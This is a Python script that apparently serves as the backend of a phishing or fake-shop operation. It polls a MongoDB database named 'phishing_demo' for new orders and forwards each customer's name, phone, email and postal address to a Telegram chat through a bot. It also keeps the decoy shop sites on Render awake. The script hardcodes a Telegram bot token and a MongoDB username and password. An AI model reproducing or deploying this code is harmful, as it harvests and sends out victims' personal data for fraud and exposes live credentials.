import time
import requests
from pymongo import MongoClient
from bson.objectid import ObjectId

# ==============================
# НАСТРОЙКИ
# ==============================
BOT_TOKEN = "8694919208:AAF6eqrbyo1HMkJjIW6owYJYZSpiLn_MiCw"
CHAT_ID = "532319147"
DATABASE_URL = "mongodb+srv://miroxlav111:Alex18122008@cluster0.tfjob.mongodb.net/phishing_demo?retryWrites=true&w=majority"
DB_NAME = "phishing_demo"
COLLECTION_NAME = "orders"
POLL_SECONDS = 10

# Ссылки для предотвращения "сна" (Render Keep-Alive)
KEEP_ALIVE_URLS = [
    "https://rre-shop-payments.onrender.com",
    "https://rre-shop-api.onrender.com",
    "https://rre-shop.onrender.com"
]
# ==============================

def keep_alive():
    """Отправляет GET запросы на сайты, чтобы они не засыпали."""
    print(f"[{time.strftime('%H:%M:%S')}] 🌐 Keeping services alive...")
    for url in KEEP_ALIVE_URLS:
        try:
            r = requests.get(url, timeout=15)
            print(f"✅ {url} - Status: {r.status_code}")
        except Exception as e:
            print(f"⚠️ Failed to ping {url}: {e}")

def send_message(text: str) -> None:
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        r = requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=20)
        r.raise_for_status()
    except Exception as e:
        print("⚠️ Telegram send error:", e)

def pick(order: dict, *keys: str, default: str = "—") -> str:
    """Берёт первое непустое значение по списку ключей."""
    for k in keys:
        v = order.get(k)
        if v is None:
            continue
        s = str(v).strip()
        if s != "":
            return s
    return default

def main() -> None:
    if not BOT_TOKEN or "ВСТАВЬ_СЮДА" in BOT_TOKEN:
        raise SystemExit("BOT_TOKEN не задан")
    if not DATABASE_URL or "mongodb+srv://" not in DATABASE_URL:
        raise SystemExit("DATABASE_URL не задан")

    client = MongoClient(DATABASE_URL)
    db = client[DB_NAME]
    col = db[COLLECTION_NAME]

    print("✅ Bot started with Full Data & Keep-Alive...")
    last_seen_id = None
    last_ping_time = 0

    # Если хотите игнорировать старые заказы при запуске, раскомментируйте:
    # last_doc = col.find_one(sort=[("_id", -1)])
    # if last_doc: last_seen_id = last_doc["_id"]

    while True:
        current_time = time.time()
        
        # Пинг сайтов раз в 60 секунд
        if current_time - last_ping_time > 60:
            keep_alive()
            last_ping_time = current_time

        try:
            query = {}
            if last_seen_id is not None:
                query = {"_id": {"$gt": last_seen_id}}

            new_orders = list(col.find(query).sort("_id", 1).limit(50))

            for o in new_orders:
                oid = str(o.get("_id", ""))

                # Сбор данных клиента
                name = pick(o, "customerName", "name")
                phone = pick(o, "phone")
                email = pick(o, "email")
                telegram = pick(o, "telegram", default="—")

                # Данные доставки
                delivery_date = pick(o, "deliveryDate")
                country = pick(o, "country", default="")
                city = pick(o, "city", default="")
                addr1 = pick(o, "addressLine1", "address", default="—")
                addr2 = pick(o, "addressLine2", default="")
                postal = pick(o, "postalCode", default="")
                notes = pick(o, "notes", "comment", default="")

                # Данные товара
                product = pick(o, "productTitle", default="—")
                price = pick(o, "productPrice", default="—")
                status = pick(o, "status", default="new")

                # Форматирование адреса
                address_lines = [addr1]
                if addr2:
                    address_lines.append(addr2)
                address_str = "\n".join(address_lines)

                # Форматирование локации
                loc_parts = []
                if country: loc_parts.append(country)
                if city: loc_parts.append(city)
                if postal: loc_parts.append(postal)
                location = ", ".join(loc_parts) if loc_parts else "—"

                # Формирование сообщения
                msg = (
                    "🆕 Новый заказ\n\n"
                    f"ID: {oid}\n"
                    f"Товар: {product}\n"
                    f"Цена: {price}\n\n"
                    f"Имя: {name}\n"
                    f"Телефон: {phone}\n"
                    f"Email: {email}\n"
                    f"Telegram: {telegram}\n\n"
                    f"Дата доставки: {delivery_date}\n"
                    f"Локация: {location}\n"
                    f"Адрес:\n{address_str}\n"
                )

                if notes:
                    msg += f"\nЗаметка: {notes}\n"

                msg += f"\nСтатус: {status}"

                send_message(msg)

                _id = o.get("_id")
                if isinstance(_id, ObjectId):
                    last_seen_id = _id

        except Exception as e:
            print("⚠️ Loop error:", e)

        time.sleep(POLL_SECONDS)

if __name__ == "__main__":
    main()
